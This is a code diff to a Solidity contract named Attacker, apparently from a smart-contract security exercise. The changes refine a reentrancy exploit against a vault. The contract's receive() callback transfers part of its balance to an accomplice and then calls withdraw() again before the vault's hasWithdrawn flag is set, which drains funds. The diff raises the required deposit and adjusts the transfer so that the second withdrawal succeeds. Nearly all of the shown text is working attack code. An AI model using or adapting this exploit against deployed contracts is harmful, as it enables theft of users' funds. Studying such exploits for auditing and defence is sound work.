@@ -14,19 +14,19 @@ contract Attacker {
     }
 
     function attack() external payable {
-        require(msg.value >= 1 ether, "Need at least 1 ether");
+        require(msg.value >= 2 ether, "Need at least 2 ether");
         vault.deposit{value: msg.value}();
         vault.withdraw();
     }
 
     receive() external payable {
-        if (attackStep == 0) {
+        if (attackStep == 0 && vault.balances(address(this)) > 0) {
             attackStep = 1;
-            // During withdraw callback, transfer balance to accomplice
-            // This resets our balance but NOT hasWithdrawn flag
-            vault.transfer(accomplice, 1 ether);
+            // Transfer half to accomplice, keeping balance for second withdraw
+            uint256 transferAmount = vault.balances(address(this)) / 2;
+            vault.transfer(accomplice, transferAmount);
             
-            // Now withdraw again - hasWithdrawn is still false!
+            // Withdraw again - hasWithdrawn is still false but we still have balance!
             vault.withdraw();
         }
     }
